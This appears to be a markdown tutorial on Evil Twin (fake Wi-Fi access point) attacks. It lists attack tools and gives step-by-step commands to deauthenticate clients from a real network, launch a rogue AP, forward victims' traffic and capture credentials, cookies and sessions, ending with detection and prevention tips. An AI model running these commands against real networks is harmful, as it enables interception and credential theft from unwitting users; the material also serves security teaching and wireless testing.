# 🎭 Evil Twin Attack / Fake Access Point (Fake AP)

# 📘 Overview

A Fake Access Point (Fake AP), also called an:

```text id="e1v7kq"
Evil Twin Attack
```

is a wireless attack where an attacker creates a rogue Wi-Fi access point that impersonates a legitimate network.

هدف / Goal:

* Trick users into connecting
* Intercept traffic
* Capture credentials
* Perform MITM (Man-in-the-Middle) attacks

---

# ⚙ How It Works

## 1️⃣ Impersonation

* Attacker creates a fake Wi-Fi network
* Uses same:

```text id="p9x4rn"
SSID (Wi-Fi Name)
```

as the real network

---

## 2️⃣ Signal Manipulation

* Rogue AP signal is made stronger
* Devices prefer stronger nearby networks

---

## 3️⃣ Client Disruption (Optional)

* Legitimate users may be disconnected
* Usually done using:

```text id="k4m2zt"
Deauthentication attacks
```

---

## 4️⃣ Automatic Reconnection

* Victim reconnects automatically
* Believes rogue AP is legitimate

---

## 5️⃣ MITM (Man-in-the-Middle)

Attacker can:

* Inspect traffic
* Modify packets
* Redirect users
* Capture credentials

---

# 🛠 Tools Used

| Tool        | Purpose                        |
| ----------- | ------------------------------ |
| airbase-ng  | Create fake AP                 |
| hostapd     | Advanced AP configuration      |
| dnsmasq     | DHCP + DNS services            |
| ettercap    | MITM attacks                   |
| bettercap   | Advanced MITM framework        |
| fluxion     | Automated Evil Twin attacks    |
| wifiphisher | Phishing-based fake AP attacks |

---

# 📡 Basic Fake AP Setup (airbase-ng)

## Step 1: Enable Monitor Mode

```bash id="m5u8ka"
airmon-ng start wlan0
```

---

## Step 2: Create Fake AP

```bash id="v7t2pn"
airbase-ng -e "FreeWifi" -c 6 wlan0mon
```

### Explanation

| Option   | Meaning            |
| -------- | ------------------ |
| -e       | ESSID / Wi-Fi name |
| -c       | Channel            |
| wlan0mon | Monitor interface  |

---

# 🌐 Provide Internet Access (Optional)

## Bring Interface Up

```bash id="b1q7xs"
ifconfig at0 up
```

---

## Assign IP Address

```bash id="t4k8zl"
ifconfig at0 10.0.0.1 netmask 255.255.255.0
```

---

## Enable IP Forwarding

```bash id="y3w9jm"
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

## Flush Old iptables Rules

```bash id="d6r2cx"
iptables --flush
```

---

## Enable NAT Forwarding

```bash id="h8m4vp"
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
```

---

## Allow Forwarding

```bash id="q5n7ut"
iptables --append FORWARD --in-interface at0 -j ACCEPT
```

---

# 📘 Attack Workflow

## Step 1

Enable monitor mode

```bash id="l9c3we"
airmon-ng start wlan0
```

---

## Step 2

(Optional) Disconnect clients from real AP

```bash id="j4x8ka"
aireplay-ng --deauth 0 -a [BSSID] wlan0mon
```

---

## Step 3

Launch fake AP

```bash id="u2p6rf"
airbase-ng -e "FreeWifi" -c 6 wlan0mon
```

---

## Step 4

Victim reconnects to fake AP

---

## Step 5

Capture:

* Credentials
* Cookies
* HTTP traffic
* Login sessions

using:

```text id="r7n4yb"
ettercap / bettercap / wireshark
```

---

# 🎯 Common Use Cases

| Use Case              | Purpose             |
| --------------------- | ------------------- |
| Credential harvesting | Fake login portals  |
| MITM attacks          | Intercept traffic   |
| Phishing attacks      | Steal credentials   |
| Session hijacking     | Capture tokens      |
| Wireless testing      | Security assessment |

---

# ⚠ Risks

* Credential theft
* Session hijacking
* DNS spoofing
* Malware delivery
* HTTPS downgrade attacks

---

# 🛡 Detection & Prevention

## For Users

* Verify Wi-Fi names carefully
* Avoid auto-connect
* Use VPN
* Check HTTPS certificates
* Avoid open/public Wi-Fi

---

## For Organizations

* Use WPA3 Enterprise
* Enable Protected Management Frames (PMF)
* Monitor rogue APs
* Use wireless IDS/IPS
* Disable automatic client roaming

---

# 📌 Important Notes

```text id="f8y2mn"
Evil Twin attacks rely heavily on user trust
```

and weak wireless awareness.

---

# 🧠 Quick Summary

| Component          | Purpose                       |
| ------------------ | ----------------------------- |
| Fake AP            | Impersonate legitimate Wi-Fi  |
| Deauth Attack      | Disconnect users from real AP |
| airbase-ng         | Create rogue AP               |
| bettercap/ettercap | MITM traffic interception     |
| dnsmasq            | DHCP/DNS service              |
| IP Forwarding      | Provide internet to victims   |
